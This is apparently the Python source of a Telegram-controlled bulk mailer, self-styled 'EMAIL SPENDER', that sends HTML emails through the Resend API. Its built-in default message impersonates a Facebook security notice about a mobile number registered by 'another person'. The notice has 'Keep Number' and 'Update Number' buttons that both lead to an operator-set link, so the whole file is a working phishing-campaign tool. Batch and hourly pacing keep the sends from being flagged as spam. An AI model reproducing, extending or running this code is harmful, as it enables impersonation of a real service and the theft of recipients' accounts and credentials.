import os
import re
import json
import time
import html
import asyncio
import logging
import functools
from pathlib import Path
from typing import List, Dict, Any, Optional

import requests
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

BASE_DIR = Path(__file__).parent
STATE_FILE = BASE_DIR / "state.json"
LOG_FILE = BASE_DIR / "campaign_log.json"

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
RESEND_API_KEY = os.getenv("RESEND_API_KEY", "").strip()   # ← Resend API key
SENDER_NAME = os.getenv("SENDER_NAME", "My Company").strip()
SENDER_EMAIL = os.getenv("SENDER_EMAIL", "").strip()
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "").strip()
WEBSITE_LINK = os.getenv("WEBSITE_LINK", "").strip()

DEFAULT_SUBJECT = os.getenv("DEFAULT_SUBJECT", "Important update from My Company").strip()
BATCH_SIZE = int(os.getenv("BATCH_SIZE", "50"))
BATCH_DELAY_SECONDS = int(os.getenv("BATCH_DELAY_SECONDS", "180"))
DAILY_LIMIT = int(os.getenv("DAILY_LIMIT", "300"))
MAX_FAILURES = int(os.getenv("MAX_FAILURES", "15"))

# Hourly rate limit: max emails per hour (0 = unlimited)
HOURLY_LIMIT_DEFAULT = int(os.getenv("HOURLY_LIMIT", "0"))

EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")

DEFAULT_BODY = """Hi there,

We wanted to let you know that your mobile number was verified and registered by another person on facebook.

This mobile number is still associated with your account. If you're still receiving SMS notifications from facebook, the person who just confirmed may also see future facebook SMS notifications sent to this number.

If you'd like to continue to keep this number on your account, click the Keep Number button.

If you'd like to make changes to your mobile number, click the Update Number button.

If you no longer use or do not have access to this phone number, please update your phone information or remove this number from your account.
"""

# ---------------------------------------------------------------------------
# State helpers
# ---------------------------------------------------------------------------

def default_state() -> Dict[str, Any]:
    return {
        "emails": [],
        "subject": DEFAULT_SUBJECT,
        "body": DEFAULT_BODY,
        "button1_text": "Keep Number",
        "button1_link": WEBSITE_LINK,
        "button2_text": "Update Number",
        "button2_link": WEBSITE_LINK,
        "paused": False,
        "sending": False,
        "campaign_task_running": False,
        "last_run": {
            "sent": 0,
            "failed": 0,
            "skipped": 0,
            "total": 0,
            "last_error": ""
        },
        "daily_sent_count": 0,
        "daily_sent_date": "",
        # --- Hourly rate limiting ---
        "hourly_limit": HOURLY_LIMIT_DEFAULT,   # 0 = no limit
        "hourly_sent_count": 0,
        "hourly_window_start": "",              # ISO timestamp of current window
        # ----------------------------
        "failed_emails": [],
        "sent_emails": [],
    }

def load_state() -> Dict[str, Any]:
    if STATE_FILE.exists():
        try:
            data = json.loads(STATE_FILE.read_text(encoding="utf-8"))
            # Back-fill keys added after first run
            defaults = default_state()
            for key, val in defaults.items():
                data.setdefault(key, val)
            return data
        except Exception:
            logging.exception("Failed to load state file")
    state = default_state()
    save_state(state)
    return state

def save_state(state: Dict[str, Any]) -> None:
    STATE_FILE.write_text(json.dumps(state, indent=2), encoding="utf-8")

def append_log(entry: Dict[str, Any]) -> None:
    logs = []
    if LOG_FILE.exists():
        try:
            logs = json.loads(LOG_FILE.read_text(encoding="utf-8"))
        except Exception:
            logging.exception("Failed to load campaign log")
    logs.append(entry)
    LOG_FILE.write_text(json.dumps(logs, indent=2), encoding="utf-8")

# ---------------------------------------------------------------------------
# Rate-limit helpers
# ---------------------------------------------------------------------------

def reset_daily_counter_if_needed(state: Dict[str, Any]) -> None:
    today = time.strftime("%Y-%m-%d")
    if state.get("daily_sent_date") != today:
        state["daily_sent_date"] = today
        state["daily_sent_count"] = 0

def reset_hourly_counter_if_needed(state: Dict[str, Any]) -> None:
    """Reset the hourly window counter if an hour has passed."""
    now = time.time()
    window_start = state.get("hourly_window_start")
    if not window_start:
        state["hourly_window_start"] = str(now)
        state["hourly_sent_count"] = 0
        return
    try:
        elapsed = now - float(window_start)
    except ValueError:
        elapsed = 9999
    if elapsed >= 3600:
        state["hourly_window_start"] = str(now)
        state["hourly_sent_count"] = 0

def seconds_until_next_hour_window(state: Dict[str, Any]) -> int:
    """Return seconds remaining in the current hourly window."""
    try:
        elapsed = time.time() - float(state.get("hourly_window_start", 0))
        remaining = max(0, 3600 - int(elapsed))
        return remaining
    except Exception:
        return 3600

def hourly_limit_reached(state: Dict[str, Any]) -> bool:
    limit = state.get("hourly_limit", 0)
    if limit <= 0:
        return False
    return state.get("hourly_sent_count", 0) >= limit

# ---------------------------------------------------------------------------
# Admin / auth
# ---------------------------------------------------------------------------

def is_admin(update: Update) -> bool:
    if not update.effective_chat:
        return False
    if not ADMIN_CHAT_ID:
        return True
    return str(update.effective_chat.id) == str(ADMIN_CHAT_ID)

def require_admin(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update):
            if update.effective_message:
                await update.effective_message.reply_text("Unauthorized.")
            return
        return await func(update, context)
    return wrapper

# ---------------------------------------------------------------------------
# Email helpers
# ---------------------------------------------------------------------------

def extract_emails(text: str) -> List[str]:
    if not text:
        return []
    parts = re.split(r"[\s,;\n\r\t]+", text.strip())
    emails = []
    for part in parts:
        email = part.strip().lower()
        if email and EMAIL_REGEX.match(email):
            emails.append(email)
    return emails

def dedupe_keep_order(items: List[str]) -> List[str]:
    seen = set()
    result = []
    for item in items:
        if item not in seen:
            seen.add(item)
            result.append(item)
    return result

# ---------------------------------------------------------------------------
# HTML email builder
# ---------------------------------------------------------------------------

def build_email_html(body: str, button1_text: str, button1_link: str,
                     button2_text: str, button2_link: str) -> str:
    escaped_body = html.escape(body).replace("\n", "<br>")
    button1 = ""
    button2 = ""

    if button1_text and button1_link:
        button1 = f"""
        <tr>
          <td align="center" style="padding-bottom: 14px;">
            <a href="{html.escape(button1_link, quote=True)}"
               style="display:inline-block;background:#2d7ff9;color:#ffffff;text-decoration:none;
                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">
              {html.escape(button1_text)}
            </a>
          </td>
        </tr>"""

    if button2_text and button2_link:
        button2 = f"""
        <tr>
          <td align="center">
            <a href="{html.escape(button2_link, quote=True)}"
               style="display:inline-block;background:#222222;color:#ffffff;text-decoration:none;
                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">
              {html.escape(button2_text)}
            </a>
          </td>
        </tr>"""

    return f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>My Company</title></head>
<body style="margin:0;padding:0;background:#f2f2f2;font-family:Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f2f2f2;padding:40px 0;">
    <tr><td align="center">
      <table width="600" cellpadding="0" cellspacing="0" border="0"
             style="background:#ffffff;border-radius:12px;padding:40px;max-width:600px;">
        <tr><td style="font-size:40px;font-weight:bold;color:#000000;padding-bottom:24px;">
          Important account update
        </td></tr>
        <tr><td style="font-size:20px;color:#111111;padding-bottom:20px;">Hello,</td></tr>
        <tr><td style="font-size:17px;line-height:1.7;color:#333333;padding-bottom:30px;">
          {escaped_body}
        </td></tr>
        {button1}
        {button2}
        <tr><td style="font-size:13px;color:#666666;line-height:1.6;padding-top:30px;">
          Sent by {html.escape(SENDER_NAME)} • {html.escape(SENDER_EMAIL)}
        </td></tr>
      </table>
    </td></tr>
  </table>
</body>
</html>"""

# ---------------------------------------------------------------------------
# Resend transactional send
# ---------------------------------------------------------------------------

def send_resend_email(to_email: str, subject: str, html_content: str) -> requests.Response:
    """
    Send a single email via Resend API.
    Docs: https://resend.com/docs/api-reference/emails/send-email
    """
    url = "https://api.resend.com/emails"
    headers = {
        "Authorization": f"Bearer {RESEND_API_KEY}",
        "Content-Type": "application/json",
    }
    # Build from field safely
    sender_name = SENDER_NAME.strip().replace("<", "").replace(">", "").replace('"', "")
    from_field = f"{sender_name} <{SENDER_EMAIL}>" if sender_name else SENDER_EMAIL
    payload = {
        "from": from_field,
        "to": [to_email],
        "subject": subject,
        "html": html_content,
    }
    return requests.post(url, json=payload, headers=headers, timeout=30)

# ---------------------------------------------------------------------------
# Telegram command handlers
# ---------------------------------------------------------------------------

@require_admin
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id if update.effective_chat else "unknown"
    text = (
        "✨ *EMAIL SPENDER* ✨\n"
        "_Elite Email Campaign Manager — Resend Edition_\n\n"
        f"🆔 *Chat ID:* `{chat_id}`\n\n"
        "📋 *CAMPAIGN SETUP*\n"
        "┣ /addemails — Import email list\n"
        "┣ /setsubject — Configure subject\n"
        "┣ /setmessage — Craft your message\n"
        "┣ /setbutton1 — Primary CTA button\n"
        "┗ /setbutton2 — Secondary CTA button\n\n"
        "⏱ *RATE CONTROLS* _(anti-spam)_\n"
        "┣ /sethourlylimit — Max emails per hour\n"
        "┗ /ratelimitstatus — View current limits\n\n"
        "🚀 *CAMPAIGN LAUNCH*\n"
        "┣ /preview — Review before sending\n"
        "┣ /testsend — Send test email\n"
        "┗ /sendcampaign — Launch campaign\n\n"
        "⚙️ *CONTROLS*\n"
        "┣ /pause — Pause campaign\n"
        "┣ /resume — Resume campaign\n"
        "┣ /status — Live statistics\n"
        "┗ /clearemails — Reset email list\n\n"
        "💎 _Powered by Resend_"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

@require_admin
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

@require_admin
async def addemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    text = update.message.text or ""
    payload = text.replace("/addemails", "", 1).strip()
    emails = extract_emails(payload)
    if not emails:
        await update.message.reply_text(
            "No valid email addresses found.\n\nUsage:\n/addemails email1@gmail.com, email2@gmail.com"
        )
        return
    combined = dedupe_keep_order(state["emails"] + emails)
    added_count = len(combined) - len(state["emails"])
    state["emails"] = combined
    save_state(state)
    await update.message.reply_text(
        f"✅ Added {added_count} emails.\n"
        f"📧 Total stored: {len(state['emails'])}"
    )

@require_admin
async def clearemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    state["emails"] = []
    state["sent_emails"] = []
    state["failed_emails"] = []
    save_state(state)
    await update.message.reply_text("✅ Email list cleared.")

@require_admin
async def setsubject(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/setsubject", "", 1).strip()
    if not payload:
        await update.message.reply_text("Usage:\n/setsubject Your subject here")
        return
    state["subject"] = payload
    save_state(state)
    await update.message.reply_text(f"✅ Subject updated:\n{payload}")

@require_admin
async def setmessage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/setmessage", "", 1).strip()
    if not payload:
        await update.message.reply_text("Usage:\n/setmessage Your message here")
        return
    state["body"] = payload
    save_state(state)
    await update.message.reply_text("✅ Message updated.")

@require_admin
async def setbutton1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/setbutton1", "", 1).strip()
    if "|" not in payload:
        await update.message.reply_text("Usage:\n/setbutton1 Button Text | https://example.com")
        return
    text_part, link_part = [x.strip() for x in payload.split("|", 1)]
    state["button1_text"] = text_part
    state["button1_link"] = link_part
    save_state(state)
    await update.message.reply_text(f"✅ Button 1 updated:\n{text_part} -> {link_part}")

@require_admin
async def setbutton2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/setbutton2", "", 1).strip()
    if "|" not in payload:
        await update.message.reply_text("Usage:\n/setbutton2 Button Text | https://example.com")
        return
    text_part, link_part = [x.strip() for x in payload.split("|", 1)]
    state["button2_text"] = text_part
    state["button2_link"] = link_part
    save_state(state)
    await update.message.reply_text(f"✅ Button 2 updated:\n{text_part} -> {link_part}")

# --- NEW: Hourly rate limit commands ---

@require_admin
async def sethourlylimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /sethourlylimit 50   → send max 50 emails per hour
    /sethourlylimit 0    → no hourly limit
    """
    state = load_state()
    payload = update.message.text.replace("/sethourlylimit", "", 1).strip()
    if not payload.isdigit():
        await update.message.reply_text(
            "Usage:\n"
            "/sethourlylimit 50   — max 50 emails/hour\n"
            "/sethourlylimit 0    — no hourly limit"
        )
        return
    limit = int(payload)
    state["hourly_limit"] = limit
    # Reset the window so it starts fresh with the new limit
    state["hourly_sent_count"] = 0
    state["hourly_window_start"] = str(time.time())
    save_state(state)
    if limit == 0:
        await update.message.reply_text("✅ Hourly limit removed (unlimited).")
    else:
        await update.message.reply_text(
            f"✅ Hourly limit set to *{limit} emails/hour*.\n"
            f"The campaign will automatically wait when the limit is reached and resume when the hour resets.",
            parse_mode=ParseMode.MARKDOWN
        )

@require_admin
async def ratelimitstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    reset_hourly_counter_if_needed(state)
    reset_daily_counter_if_needed(state)
    save_state(state)

    hourly_limit = state.get("hourly_limit", 0)
    hourly_sent = state.get("hourly_sent_count", 0)
    secs_left = seconds_until_next_hour_window(state)
    mins_left = secs_left // 60

    text = (
        "⏱ *RATE LIMIT STATUS*\n\n"
        f"🕐 *Hourly limit:* {hourly_limit if hourly_limit > 0 else 'Unlimited'}\n"
        f"📤 *Sent this hour:* {hourly_sent}\n"
        f"⏳ *Hour resets in:* {mins_left}m {secs_left % 60}s\n\n"
        f"📅 *Daily limit:* {DAILY_LIMIT}\n"
        f"📊 *Sent today:* {state.get('daily_sent_count', 0)}\n\n"
        "_Use /sethourlylimit to change the hourly cap._"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# --- Existing commands unchanged ---

@require_admin
async def preview(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    preview_text = (
        "👁 *CAMPAIGN PREVIEW*\n\n"
        f"📌 *Subject:*\n{state['subject']}\n\n"
        f"📝 *Message:*\n{state['body']}\n\n"
        f"🔵 *Button 1:*\n{state['button1_text']} -> {state['button1_link']}\n\n"
        f"⚫ *Button 2:*\n{state['button2_text']} -> {state['button2_link']}\n\n"
        f"📧 *Stored emails:* {len(state['emails'])}"
    )
    await update.message.reply_text(preview_text, parse_mode=ParseMode.MARKDOWN)

@require_admin
async def testsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    payload = update.message.text.replace("/testsend", "", 1).strip()
    emails = extract_emails(payload)
    if not emails:
        await update.message.reply_text("Usage:\n/testsend your@email.com")
        return
    test_email = emails[0]
    await update.message.reply_text(f"📤 Sending test email to {test_email}...")
    html_content = build_email_html(
        state["body"],
        state["button1_text"],
        state["button1_link"],
        state["button2_text"],
        state["button2_link"]
    )
    try:
        resp = send_resend_email(test_email, state["subject"], html_content)
        if 200 <= resp.status_code < 300:
            await update.message.reply_text(f"✅ Test email sent to {test_email}")
        else:
            await update.message.reply_text(
                f"❌ Test send failed.\nStatus: {resp.status_code}\nResponse: {resp.text[:500]}"
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ---------------------------------------------------------------------------
# Campaign runner (Resend + hourly rate limiting)
# ---------------------------------------------------------------------------

async def campaign_runner(app, chat_id: int):
    state = load_state()
    if state.get("campaign_task_running"):
        return

    state["campaign_task_running"] = True
    state["sending"] = True
    state["paused"] = False
    state["last_run"] = {
        "sent": 0,
        "failed": 0,
        "skipped": 0,
        "total": len(state["emails"]),
        "last_error": ""
    }
    save_state(state)
    reset_daily_counter_if_needed(state)
    reset_hourly_counter_if_needed(state)
    save_state(state)

    html_content = build_email_html(
        state["body"],
        state["button1_text"],
        state["button1_link"],
        state["button2_text"],
        state["button2_link"]
    )

    failure_count = 0
    sent_this_run = 0
    failed_emails = []
    sent_emails = []

    try:
        email_pool = dedupe_keep_order(state["emails"])
        unsent = [e for e in email_pool if e not in state.get("sent_emails", [])]

        if not unsent:
            state["sending"] = False
            state["campaign_task_running"] = False
            save_state(state)
            await app.bot.send_message(chat_id=chat_id, text="📭 No unsent emails left.")
            return

        hourly_limit = state.get("hourly_limit", 0)
        limit_info = f"⏱ Hourly limit: {hourly_limit if hourly_limit > 0 else 'None'}"

        await app.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🚀 Campaign started!\n"
                f"📧 Total unsent: {len(unsent)}\n"
                f"📦 Batch size: {BATCH_SIZE}\n"
                f"⏱ Delay between batches: {BATCH_DELAY_SECONDS}s\n"
                f"{limit_info}"
            )
        )

        for i in range(0, len(unsent), BATCH_SIZE):
            state = load_state()

            if state.get("paused"):
                state["sending"] = False
                state["campaign_task_running"] = False
                save_state(state)
                await app.bot.send_message(chat_id=chat_id, text="⏸ Campaign paused.")
                return

            reset_daily_counter_if_needed(state)
            reset_hourly_counter_if_needed(state)
            save_state(state)

            if state["daily_sent_count"] >= DAILY_LIMIT:
                state["sending"] = False
                state["campaign_task_running"] = False
                save_state(state)
                await app.bot.send_message(
                    chat_id=chat_id,
                    text=f"🛑 Daily limit reached ({DAILY_LIMIT}). Resume tomorrow."
                )
                return

            batch = unsent[i:i + BATCH_SIZE]
            batch_sent = 0
            batch_failed = 0

            for email in batch:
                state = load_state()
                reset_daily_counter_if_needed(state)
                reset_hourly_counter_if_needed(state)

                if state["paused"]:
                    state["sending"] = False
                    state["campaign_task_running"] = False
                    save_state(state)
                    await app.bot.send_message(chat_id=chat_id, text="⏸ Campaign paused.")
                    return

                if state["daily_sent_count"] >= DAILY_LIMIT:
                    state["sending"] = False
                    state["campaign_task_running"] = False
                    save_state(state)
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text=f"🛑 Daily limit reached ({DAILY_LIMIT}). Resume tomorrow."
                    )
                    return

                # --- Hourly rate limit check ---
                if hourly_limit_reached(state):
                    wait_secs = seconds_until_next_hour_window(state)
                    wait_mins = wait_secs // 60
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text=(
                            f"⏳ Hourly limit of {state['hourly_limit']} reached.\n"
                            f"⏱ Waiting {wait_mins}m {wait_secs % 60}s for next window...\n"
                            f"_(Campaign will resume automatically)_"
                        ),
                        parse_mode=ParseMode.MARKDOWN
                    )
                    await asyncio.sleep(wait_secs + 5)   # +5s buffer
                    state = load_state()
                    reset_hourly_counter_if_needed(state)
                    save_state(state)
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text="▶️ Hourly window reset — resuming sends."
                    )

                try:
                    resp = send_resend_email(email, state["subject"], html_content)
                    if 200 <= resp.status_code < 300:
                        sent_this_run += 1
                        batch_sent += 1
                        state["daily_sent_count"] += 1
                        state["hourly_sent_count"] = state.get("hourly_sent_count", 0) + 1
                        state["sent_emails"] = dedupe_keep_order(
                            state.get("sent_emails", []) + [email]
                        )
                        save_state(state)
                        sent_emails.append(email)
                    else:
                        batch_failed += 1
                        failure_count += 1
                        failed_emails.append({
                            "email": email,
                            "status": resp.status_code,
                            "response": resp.text[:300]
                        })
                        state["failed_emails"] = state.get("failed_emails", []) + [email]
                        state["last_run"]["last_error"] = f"{resp.status_code}: {resp.text[:200]}"
                        save_state(state)
                except Exception as e:
                    batch_failed += 1
                    failure_count += 1
                    failed_emails.append({"email": email, "status": "exception", "response": str(e)})
                    state["failed_emails"] = state.get("failed_emails", []) + [email]
                    state["last_run"]["last_error"] = str(e)
                    save_state(state)

                if failure_count >= MAX_FAILURES:
                    state["sending"] = False
                    state["campaign_task_running"] = False
                    state["last_run"]["sent"] = sent_this_run
                    state["last_run"]["failed"] = failure_count
                    save_state(state)
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text=f"🛑 Campaign stopped: too many failures ({failure_count})."
                    )
                    append_log({
                        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "result": "stopped_too_many_failures",
                        "sent": sent_this_run,
                        "failed": failure_count,
                        "failed_emails": failed_emails,
                    })
                    return

            state = load_state()
            state["last_run"]["sent"] = sent_this_run
            state["last_run"]["failed"] = failure_count
            save_state(state)

            await app.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"📦 Batch done!\n"
                    f"✅ Sent: {batch_sent}\n"
                    f"❌ Failed: {batch_failed}\n"
                    f"📊 Total sent: {sent_this_run}\n"
                    f"⚠️ Total failures: {failure_count}\n"
                    f"⏱ Sent this hour: {state.get('hourly_sent_count', 0)}"
                    + (f" / {state['hourly_limit']}" if state.get('hourly_limit', 0) > 0 else "")
                )
            )

            if i + BATCH_SIZE < len(unsent):
                await asyncio.sleep(BATCH_DELAY_SECONDS)

        state = load_state()
        state["sending"] = False
        state["campaign_task_running"] = False
        state["last_run"]["sent"] = sent_this_run
        state["last_run"]["failed"] = failure_count
        save_state(state)

        append_log({
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "result": "completed",
            "sent": sent_this_run,
            "failed": failure_count,
            "failed_emails": failed_emails,
            "sent_emails_count": len(sent_emails),
        })

        await app.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🎉 Campaign completed!\n"
                f"✅ Sent: {sent_this_run}\n"
                f"❌ Failed: {failure_count}"
            )
        )

    except Exception as e:
        state = load_state()
        state["sending"] = False
        state["campaign_task_running"] = False
        state["last_run"]["last_error"] = str(e)
        save_state(state)
        await app.bot.send_message(chat_id=chat_id, text=f"❌ Campaign crashed: {e}")

# ---------------------------------------------------------------------------
# Launch commands
# ---------------------------------------------------------------------------

@require_admin
async def sendcampaign(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    if not RESEND_API_KEY or not BOT_TOKEN or not SENDER_EMAIL:
        await update.message.reply_text("❌ Missing environment variables.")
        return
    if state.get("campaign_task_running"):
        await update.message.reply_text("⚠️ Campaign already running.")
        return
    if not state["emails"]:
        await update.message.reply_text("📭 No emails stored. Use /addemails first.")
        return
    app = context.application
    chat_id = update.effective_chat.id
    asyncio.create_task(campaign_runner(app, chat_id))
    await update.message.reply_text("🚀 Campaign launched!")

@require_admin
async def pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    state["paused"] = True
    state["sending"] = False
    save_state(state)
    await update.message.reply_text("⏸ Campaign paused.")

@require_admin
async def resume(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    if state.get("campaign_task_running"):
        await update.message.reply_text("⚠️ Campaign is already running.")
        return
    state["paused"] = False
    save_state(state)
    app = context.application
    chat_id = update.effective_chat.id
    asyncio.create_task(campaign_runner(app, chat_id))
    await update.message.reply_text("▶️ Campaign resumed!")

@require_admin
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = load_state()
    reset_hourly_counter_if_needed(state)
    save_state(state)

    hourly_limit = state.get("hourly_limit", 0)
    hourly_sent = state.get("hourly_sent_count", 0)
    secs_left = seconds_until_next_hour_window(state)

    text = (
        "📊 *CAMPAIGN STATUS*\n\n"
        f"📧 Stored emails: {len(state['emails'])}\n"
        f"📤 Sending: {state.get('sending')}\n"
        f"⏸ Paused: {state.get('paused')}\n"
        f"🔄 Running: {state.get('campaign_task_running')}\n\n"
        f"✅ Last run sent: {state['last_run'].get('sent', 0)}\n"
        f"❌ Last run failed: {state['last_run'].get('failed', 0)}\n\n"
        f"📅 Daily sent: {state.get('daily_sent_count', 0)} / {DAILY_LIMIT}\n"
        f"⏱ Hourly sent: {hourly_sent}"
        + (f" / {hourly_limit}" if hourly_limit > 0 else " (no limit)")
        + f"\n⏳ Hour resets in: {secs_left // 60}m {secs_left % 60}s\n\n"
        f"⚠️ Last error: {state['last_run'].get('last_error', '') or 'None'}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# ---------------------------------------------------------------------------
# Startup validation & main
# ---------------------------------------------------------------------------

def validate_startup():
    missing = []
    if not BOT_TOKEN:
        missing.append("BOT_TOKEN")
    if not RESEND_API_KEY:
        missing.append("RESEND_API_KEY")
    if not SENDER_EMAIL:
        missing.append("SENDER_EMAIL")
    if missing:
        raise RuntimeError(f"Missing environment variables: {', '.join(missing)}")

def main():
    validate_startup()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("addemails", addemails))
    app.add_handler(CommandHandler("clearemails", clearemails))
    app.add_handler(CommandHandler("setsubject", setsubject))
    app.add_handler(CommandHandler("setmessage", setmessage))
    app.add_handler(CommandHandler("setbutton1", setbutton1))
    app.add_handler(CommandHandler("setbutton2", setbutton2))
    app.add_handler(CommandHandler("preview", preview))
    app.add_handler(CommandHandler("testsend", testsend))
    app.add_handler(CommandHandler("sendcampaign", sendcampaign))
    app.add_handler(CommandHandler("pause", pause))
    app.add_handler(CommandHandler("resume", resume))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("sethourlylimit", sethourlylimit))    # NEW
    app.add_handler(CommandHandler("ratelimitstatus", ratelimitstatus))  # NEW
    logging.info("Bot started (Resend edition)")
    app.run_polling()

if __name__ == "__main__":
    main()
